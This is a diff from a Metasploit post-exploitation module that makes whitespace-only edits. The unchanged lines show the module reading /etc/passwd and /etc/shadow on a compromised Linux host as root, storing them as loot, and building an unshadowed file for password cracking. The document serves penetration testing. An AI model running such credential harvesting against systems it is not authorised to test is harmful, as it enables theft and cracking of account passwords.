@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Post
 		if is_root?
 			passwd_file = read_file("/etc/passwd")
 			shadow_file = read_file("/etc/shadow")
-			
+
 			# Save in loot the passwd and shadow file
 			store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
 			store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Post
 			# Save pwd file
 			upassf = store_loot("linux.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Linux Unshadowed Password File")
 			print_good("Unshadowed Password File: #{upassf}")
-			
+
 		else
 			print_error("You must run this module as root!")
 		end
